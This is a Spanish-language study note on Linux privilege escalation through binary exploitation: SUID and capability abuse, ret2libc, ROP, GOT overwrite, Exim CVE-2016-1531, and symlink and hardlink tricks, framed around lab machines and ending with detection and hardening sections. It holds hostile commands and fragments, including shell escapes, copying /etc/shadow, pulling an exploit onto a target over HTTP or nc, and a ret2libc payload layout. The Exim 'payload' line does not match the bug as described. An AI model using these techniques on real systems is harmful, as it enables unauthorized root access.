---
aliases:
  - Elevación de Privilegios Binarios
  - Exim CVE-2016-1531
  - Buffer Overflow SUID
tags:
  - sec/priv-esc
  - sec/linux
  - sec/explotacion
tipo: concepto
estado: terminado
creado: 2026-10-11
actualizado: 2026-10-11
relacionado:
  - "[[Privilegios SUID en Linux]]"
  - "[[Linux Capabilities]]"
  - "[[Secuestro de Bibliotecas Compartidas]]"
  - "[[Python Library Hijacking]]"
  - "[[PATH Hijacking]]"
  - "[[Vulnerabilidades del Kernel y Escalada de Privilegios]]"
  - "[[Abuso de Permisos en Linux y LSE]]"
  - "[[Ghidra - Reverse Engineering Tool]]"
  - "[[GHex Editor Hexadecimal]]"
fuente: "https://gtfobins.github.io/"
---

# Elevación de Privilegios mediante Explotación de Binarios

Los binarios privilegiados son la superficie donde la **misma vulnerabilidad** (un overflow, una variable de entorno mal filtrada, un wildcard) cambia de "bug del usuario" a **root**. Esta nota cubre las técnicas de explotación de binarios para escalada: abuso de SUID/capabilities, memoria (ret2libc, ROP), manipulación de sistema de archivos (wildcards, symlinks, hardlinks, inodes), *GOT overwrite*, y el día a día operativo (cuándo compilar en el target, cómo transferir el exploit).

> [!info] Contexto de la clase
> Los ejemplos ilustrativos de esta nota provienen de entornos de laboratorio controlados, diseñados para demostrar la importancia de una configuración y protección adecuadas: binarios legítimos y personalizados pueden ser explotados para obtener privilegios elevados. Todo se documenta como referencia de estudio; la explotación se practica en labs propios (ver enlaces al final).

## Mecánica: por qué un bug "de usuario" se vuelve root

| Condición | Mecanismo | Resultado |
|---|---|---|
| **SUID root** (`-rwsr-xr-x`, dueño root) | el kernel fija **EUID=0** durante la ejecución | cualquier bug dentro del proceso corre como root |
| **Capability** (`getcap -r /`) | el binario conserva `CAP_SETUID`, `CAP_DAC_OVERRIDE`, `CAP_SYS_ADMIN`… | mismo efecto sin bit SUID |
| **Proceso root** (cron, daemon, sudo) | el bug se dispara en su contexto | p. ej. Exim SUID abusando entorno (ver caso 1) |
| **Biblioteca/PATH manipulable** | el binario privilegiado carga lo que vos escribís | ver [[Secuestro de Bibliotecas Compartidas]] |

La pregunta inicial de toda explotación: **¿quién ejecuta este binario y con qué EUID?**

```bash
find / -perm -4000 -type f 2>/dev/null        # candidatos SUID
getcap -r / 2>/dev/null                       # candidatos con capabilities
ls -la binario; stat -c '%A %U:%G' binario    # confirmar SUID + dueño root
file binario; checksec --file=binario 2>/dev/null   # arquitectura + protecciones
```

## Fase 1: abuso directo de binarios (sin memoria)

Antes de mirar un solo byte de pila, agotá las vías "de autor" — son las que cubre **GTFOBins**: para cada binario privilegiado, su página lista si admite **Sudo**, **SUID**, **Capabilities**, **Shell**, **File write**, **File read**, **Command injection** (sección completa: https://gtfobins.github.io/).

| Vía | Ejemplo | Ver también |
|---|---|---|
| SUID + shell integrado | `sudo vi -c ':!/bin/sh'`, `find . -exec /bin/sh \;` | [[Abuso de Privilegios Sudoers]] |
| SUID + lectura/escritura | `cp /etc/shadow /tmp/`, `tee`, `dd` | [[Privilegios SUID en Linux]] |
| Capabilities | `/usr/bin/python3 cap_setuid=ep` → `prctl`/`setuid(0)` | [[Linux Capabilities]] |
| Carga de código | `LD_PRELOAD` (solo sin SUID), rpath, `PYTHONPATH` | [[Secuestro de Bibliotecas Compartidas]], [[Python Library Hijacking]] |
| Wildcards/args | `tar`, `zip`, `find` con argumentos fabricados | sección "Sistema de archivos" abajo |

### Transferencia de exploits a la máquina target

En lab real no hay compiler ni tienes tu herramienta; las tres rutas clásicas:

```bash
# 1) Base64 (idempotente, no se rompe con binarios)
#    origen:
base64 -w0 exploit.bin > exploit.b64          # o: base64 exploit.bin | tr -d '\n'
#    destino:
echo '<PEGA_AQUI>' | base64 -d > exploit.bin && chmod +x exploit.bin

# 2) Servidor HTTP efímero + wget/curl en target
python3 -m http.server 8000                   # origen (cwd = directorio a servir)
wget http://10.10.14.5:8000/exploit.bin       # destino
curl -o exploit.bin http://10.10.14.5:8000/exploit.bin

# 3) nc (si no hay wget/curl)
#    origen: nc -lvnp 8000 < exploit.bin
#    destino: nc 10.10.14.5 8000 > exploit.bin
```

Variantes útiles: `scp`/`sftp` si hay SSH; por web, subir a un directorio writable y leerlo con `curl`; en Windows, certutil/PowerShell — fuera del alcance de esta nota.

### ¿Compilar en el target?

| Situación | Decisión |
|---|---|
| `gcc`/`cc` disponible y versión suficiente | **compilar en target** — evita problemas de glibc y arquitectura: `gcc exploit.c -o exploit` |
| Sin compiler | transferir binario **estático** (`musl-gcc -static` en origen) o script Python/Bash |
| Arquitectura desconocida | `uname -m` (`x86_64`/`i686`/`aarch64`) — un binario de 64 no corre en 32 y viceversa |
| glibc distinta entre orig/target | compilar en target o usar static — los binarios ligados dinámicamente contra otra glibc fallan con `version 'GLIBC_2.34 not found'` |
| Solo tenés Python | `python3 -c` puro (payloads de setuid) — sin compilación |

```bash
which gcc cc musl-gcc python3 perl ruby; uname -m; ldd --version | head -1
```

## Fase 2: explotación de memoria — panorama

Cuando el binario SUID tiene un bug de memoria (el caso típico de laboratorio), el flujo es:

`` enumerar → checksec → hallar crash (EIP/RIP control) → identificar offset → fuga de direcciones → payload → shell root ``

### Protecciones y cómo condicionan el ataque

| Protección | Qué hace | Cómo verificar | Efecto en el exploit |
|---|---|---|---|
| **NX/DEP** | pila no ejecutable | `checksec` → `NX enabled` | no sirve shellcode en pila → **ret2libc/ROP** |
| **PIE** | base del binario aleatorizada | `PIE enabled` | requiere fuga antes de usar direcciones del binario |
| **ASLR** | libc/pila/stack aleatorizados | `cat /proc/sys/kernel/randomize_va_space` (2 = full) | necesita leak o *partial overwrite* |
| **Canary** | valor guardado antes de ret | `Stack canary found` | hay que **fuga el canary** primero (overflow de lectura o brute-force de byte) |
| **RELRO** | GOT en solo-lectura (full) | `Full RELRO` | impide *GOT overwrite* parcial (ver sección) |
| **FORTIFY/stack-protector** | wrappers a funciones inseguras | `checksec`/strings | bloquea overflow en ciertas calls |

**checksec** (de pwntools: `from pwn import *; context.binary = ELF('./custom')` o `pwn checksec custom`):

`` Archivo: custom — Arch: i386-32, RELRO: Partial RELRO, Stack: Canary found, NX: enabled, PIE: No PIE ``

### Técnica A: ret2libc (clásica para SUID 32 bits con NX)

**Ret2libc** (*Return-to-libc*) redirige el flujo a funciones **ya presentes en libc** (`system()`, `execve()`, `exit()`) en lugar de inyectar shellcode — necesaria cuando la pila no es ejecutable (NX/DEP). Con ASLR, las direcciones de libc se aleatorizan y hay que fugarlas o trabajar con offsets relativos.

Esquema del payload en pila (32 bits, argumentos por pila):

`` [padding hasta EIP] [dirección de system()] [dirección de exit()] [dirección de "/bin/sh" en libc] ``

```python
from pwn import *
elf = ELF('./custom'); libc = ELF('/lib32/libc.so.6')
# 1) descubrir offset del crash
#    cyclic 200  →  correr  →  leer EIP con dmesg/gdb: cyclic -l <eip>
# 2) fuga de libc (si hay ASLR): leak de puts@got → calcula base de libc
rop = ROP(elf)
rop.call(elf.plt['puts'], [elf.got['puts']])   # leak
rop.call(elf.entry)
# 3) tras el leak: system = libc.address + offset(system)
```

> [!tip] Escenario de la clase: binario CUSTOM 32 bits con ASLR
> El laboratorio usa un binario SUID 32 bits en Ubuntu 16.04 con protecciones activas y ASLR: el objetivo es un **ret2libc** sobre un binario propiedad de `root` con bit SUID, inyectando comandos privilegiados. Ubuntu 16.04 es reproducible porque mantiene libc de 32 bits y herramientas clásicas de la época del curso.

### Técnica B: ROP (cuando no hay `system` cómoda o hay canary+PIE)

**ROP** (*Return-Oriented Programming*) encadena *gadgets* — fragmentos terminados en `ret` — del binario/libc para construir la operación deseada (`execve("/bin/sh", 0, 0)`):

```bash
ROPgadget --binary ./custom --only "pop|ret" | head -30
# o desde pwntools:
# rop = ROP(elf); rop.execve('/bin/sh', 0, 0)
```

Diferencia práctica con ret2libc: ROP no necesita una función "limpia" como `system`; con `pop eax; int 0x80` (32 bits) o `syscall` (64) se arma la llamada a mano. El coste: necesitás **todas las direcciones**, o sea leak previo si hay PIE/ASLR.

### Técnica C: GOT overwrite

El **GOT** (*Global Offset Table*) guarda las direcciones resueltas de las funciones importadas. Si el binario tiene **Partial RELRO** (GOT escribible) y tenés un *write primitive* apuntando a un puntero de función:

```
objetivo: sobrescribir free@GOT (o strlen@GOT, exit@GOT…) por system()
efecto:   la siguiente free(ptr) con ptr="/bin/sh" ⇒ system("/bin/sh")
```

Con `system()` y `puts@GOT` en direcciones conocidas (no PIE) el payload clásico es `fmtstr`/`write-what-where` → `*(GOT de puts) = system`. **Full RELRO** lo bloquea (`GNU_RELRO` + BIND_NOW): el GOT es de solo lectura tras relocarse, y hay que pasar a ROP.

### Caso real 1: Exim CVE-2016-1531 (variables de entorno)

El primer ejemplo se enfoca en explotar el binario legítimo **exim-4.84-7**, que presenta la vulnerabilidad **CVE-2016-1531**. Permite ejecutar comandos privilegiados mediante el abuso de ciertas variables de entorno: un fallo de escalada local que permite a un usuario no privilegiado ejecutar código arbitrario como `root` por un manejo inadecuado de `PATH`/`LD_PRELOAD` cuando Exim se ejecuta con privilegios elevados (SUID root). Un atacante puede manipular estas variables para cargar bibliotecas maliciosas o ejecutar binarios arbitrarios.

```bash
# Patrón general (documentado, practicar en el lab):
# Exim SUID llama a helpers por nombre/entorno → plantar helper en dir de PATH
# del proceso o biblioteca vía LD_LIBRARY_PATH según la fase del bug.
perl -e 'print "A" x 5000' > /tmp/input   # payload documentado en advisories
```

Máquina de laboratorio: **Pluck (Vulnhub)** — https://www.vulnhub.com/entry/pluck-1,178/

### Caso real 2: ret2libc SUID 32 bits (binario CUSTOM)

- Ubuntu 16.04.7 LTS (Xenial): https://releases.ubuntu.com/16.04/
- Binario **CUSTOM**: https://hack4u.io/wp-content/uploads/2023/04/custom

> [!warning] Instrucciones para el Binario CUSTOM
> Una vez descargado el binario `custom`, es crucial **quitarle la extensión `.txt`** si el navegador la añade automáticamente. Posteriormente, asegúrate de otorgarle permisos de ejecución (`chmod +x custom`) y, para el escenario de escalada de privilegios, configúralo con el bit SUID y como propiedad de `root` (`sudo chown root:root custom && sudo chmod u+s custom`).

## Fase 3: manipulación de sistema de archivos como "exploit de binarios"

Muchas escaladas no tocan memoria: **engañan al binario privilegiado** sobre lo que lee/escribe.

| Técnica | Mecanismo | Ejemplo de abuso | Contramedida |
|---|---|---|---|
| **Wildcard** | el binario expande `*` y acepta args peligrosos | `tar` + `--checkpoint-action=exec=`, `zip --unzip-command` | no usar comodines con args de usuario; enumerar con `find` | 
| **Symlink** | puntero a ruta que cambia tras la validación | `ln -s /etc/shadow /tmp/out`; script que valida y luego copia | `open(O_NOFOLLOW)`, no seguir enlaces de directorios compartidos |
| **Hardlink** | mismo **inode**, dos nombres — sobrevive a `mv` y bloquea delete | `ln /etc/passwd /tmp/p` (si mismo FS): el binario "borra" el nombre pero el contenido sigue | prohibir hardlinks a no-propietario (`fs.protected_hardlinks=1`) |
| **Race (TOCTOU)** | ventana entre *test* y *use* | validar `stat()` y abrir después; en la ventana cambiá el symlink | `openat` + `O_NOFOLLOW`/`O_NOCTTY`, re-chequear tras abrir |
| **Inode reuse** | el FS reutiliza inodes liberados | programa reabre "su" archivo borrado y pisa uno nuevo | no borrar/recrear en directorios compartidos; `fs.protected_symlinks=1` |
| **/proc self fd** | descriptor heredado a archivo ya abierto | `>/proc/<pid>/fd/3` escribe al archivo original aunque renombres | cerrar fds en fork (`FD_CLOEXEC`) |

```bash
# Detección de la técnica: ¿el binario SUID escribe a ruta predecible?
ls -la /proc/$(pgrep -f proceso)/fd 2>/dev/null      # qué FDs tiene abierto
strace -f -e trace=openat,write,unlink binario 2>/dev/null | tail   # patrón test-then-open

# Hardlink (concepto)
ln /etc/passwd /tmp/mismo-inode    # falla si fs.protected_hardlinks=1 o FS distinto
stat -c '%i' /etc/passwd /tmp/mismo-inode   # mismo número de inode = mismo archivo
```

> [!tip] Protecciones del kernel que neutralizan symlinks/hardlinks
> `sysctl fs.protected_symlinks=1` (ignora symlinks en sticky dirs si no son del dueño) y `fs.protected_hardlinks=1` (prohíbe hardlink a archivos ajenos) están **activos por defecto desde 2009+** — si están en 0, es un hallazgo de hardening por sí solo.

## Flujo de trabajo completo de un caso de lab

1. **Enumera**: `find / -perm -4000` + `getcap` + `sudo -l` → candidatos ([[Abuso de Permisos en Linux y LSE]]).
2. **Clasifica**: ¿GTFOBins/SUID abuse lo resuelve? → si sí, 5 minutos, fin (Fase 1).
3. **Analiza el binario**: `file`, `checksec`, `strings`, Ghidra/`gdb` para el flujo de datos (ver [[Ghidra - Reverse Engineering Tool]]).
4. **Controla el crash**: `cyclic N` → crash → EIP/RIP → `cyclic -l`.
5. **Resuelve protecciones**: canary → leak; libc → leak (`puts@GOT`); PIE → leak de texto.
6. **Construye payload**: ret2libc (NX simple) o ROP (todo combinado).
7. **Transfiere y ejecuta**: base64/http (arriba) → `./exploit` → **shell root**.
8. **Verifica**: `id` debe decir `uid=0(root)` — no dar por bueno un "root" del contenedor (ver [[Abuso de Docker para Escalada de Privilegios y Escape de Contenedores]]).

## Detección (lado defensor)

- **auditd** sobre binarios SUID: `auditctl -w /usr/local/bin -p wa -k local_bin_write`; alarmar ante `chmod u+s` (`-a always,exit -F arch=b64 -S chmod -S fchmod` filtrando mode 04000).
- **Ejecuciones de binarios SUID con entorno manipulado**: syslog no lo guarda, pero EDR/`execsack` sí (`LD_*`, `PYTHONPATH` no estándar).
- **Llamadas sospechosas desde SUID**: `ptrace` de SUID está bloqueado por `yama` (`/proc/sys/kernel/yama/ptrace_scope=1`), pero un crash de SUID deja core dumps (`/var/crash`, `core_pattern`) → revisar.
- **Escrituras en GOT/`.data`**: EDR con ETW/`perf` — en Linux, detección de inyección vía `memfd_create` + `execveat` es señal clara.
- FIM sobre `/usr/bin`, `/usr/local/bin`: binario modificado fuera de ventana de paquete.

## Impacto

- **Shell root inmediata** (SUID + GTFOBins, o ret2libc exitoso) — objetivo final de la escalada.
- Con capabilities parciales: subir a root vía `setuid(0)` si la cap es `CAP_SETUID`, o lectura total con `CAP_DAC_OVERRIDE` (robo de `shadow`, keys).
- Si el binario corre en contexto de servicio → también **lateral movement** (SSH del servicio, tokens en su entorno).

## Sección defensiva: endurecimiento

```bash
# 1. Mínimo SUID: retirar lo heredado/innecesario
find / -xdev -perm -4000 -ls
chmod u-s /usr/bin/nc.traditional /usr/bin/tee /usr/local/bin/tool_heredado

# 2. Mínimas capabilities
getcap -r / ; setcap -r /usr/bin/python3      # retirar cap de intérpretes

# 3. Protecciones de kernel para symlinks/hardlinks
sysctl -w fs.protected_symlinks=1
sysctl -w fs.protected_hardlinks=1
sysctl -w kernel.randomize_va_space=2
sysctl -w kernel.yama.ptrace_scope=1

# 4. Compilar/instalar con protecciones (punto de partida del vendor)
gcc -fstack-protector-strong -D_FORTIFY_SOURCE=2 -Wl,-z,relro,-z,now -pie -fPIE exploit.c -o tool

# 5. No distribuir binarios SUID propios; usar capabilities concretas en su lugar
setcap cap_dac_read_search+ep /usr/local/bin/backup_reader
```

Para vulnerabilidades de kernel como vector alternativo (dirty pipe, dirtycow, CVE locales), ver [[Vulnerabilidades del Kernel y Escalada de Privilegios]].

## Errores comunes

1. **Saltar directo al overflow** cuando un `sudo -l`/GTFOBins daba root en 2 minutos — siempre Fase 1 primero.
2. **No verificar arquitectura**: `file custom` antes de nada; un payload i386 contra amd64 muere con `SIGSEGV` en la dirección equivocada.
3. **Calcular el offset a ojo con `AAAA…`** — usa `cyclic`; los bytes no lineales (NUL, `\n`) cortan el input antes del EIP.
4. **Olvidar que SUID ignora `LD_PRELOAD`** (dynamic linker lo descarta con euid≠ruid) — por eso el truco real en libs ajenas es `LD_LIBRARY_PATH` en binarios **no** SUID o el vector de [[Secuestro de Bibliotecas Compartidas]].
5. **False positive con "binario root ejecutándote"**: si el binario NO es SUID y no corre en proceso root, tu overflow solo te da… tu propio usuario.
6. **Subir exploit sin `chmod +x`** o con CRLF (`$'\r'` → `Exec format error`).
7. **Asumir gcc disponible** — verificar antes de diseñar el plan (tabla "¿Compilar en target?").

## Cheatsheet

```bash
# Enumeración
find / -perm -4000 -type f 2>/dev/null; getcap -r / 2>/dev/null; sudo -l
file b; checksec --file=b 2>/dev/null; ldd b; uname -m

# Transferencia
base64 -w0 e > e.b64 ; echo '<b64>' | base64 -d > e && chmod +x e
python3 -m http.server 8000   #  wget http://HOST:8000/e
nc -lvnp 8000 < e  /  nc HOST 8000 > e

# Memoria
cyclic 200 → crash → cyclic -l <eip>
ret2libc:  [pad][system][exit][/bin/sh]
ROPgadget --binary b --only "pop|ret"
# RELRO parcial → write-what-where a free@GOT = system

# FS tricks
ln -s /etc/shadow /tmp/x ; ln /etc/passwd /tmp/h   # symlink / hardlink (mismo inode)
strace -f -e openat,unlink b

# Protecciones
sysctl fs.protected_symlinks fs.protected_hardlinks kernel.randomize_va_space
```

## Referencias

- GTFOBins (framing de todos los binarios SUID/sudo/caps): https://gtfobins.github.io/
- HackTricks — Binary exploitation / SUID: https://book.hacktricks.wiki/
- PayloadsAllTheThings — Binary exploitation: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Binary%20Exploitation
- pwntools documentation: https://docs.pwntools.com/
- ROPgadget: https://github.com/JonathanSalwan/ROPgadget
- Máquina Pluck (Vulnhub): https://www.vulnhub.com/entry/pluck-1,178/ · Ubuntu 16.04: https://releases.ubuntu.com/16.04/ · Binario CUSTOM: https://hack4u.io/wp-content/uploads/2023/04/custom
- Notas internas: [[Privilegios SUID en Linux]], [[Linux Capabilities]], [[Secuestro de Bibliotecas Compartidas]], [[Vulnerabilidades del Kernel y Escalada de Privilegios]]

## Relacionadas

- [[Privilegios SUID en Linux]] — catálogo de binarios SUID y abuso directo
- [[Linux Capabilities]] — explotación sin bit SUID
- [[Secuestro de Bibliotecas Compartidas]] — inyección de `.so` en binarios privilegiados
- [[Python Library Hijacking]] — `sitecustomize.py` contra scripts Python de root
- [[PATH Hijacking]] — el vector de entorno más frecuente (caso Exim)
- [[Ghidra - Reverse Engineering Tool]] — análisis estático del binario objetivo
- [[GHex Editor Hexadecimal]] — inspección de cabeceras/strings
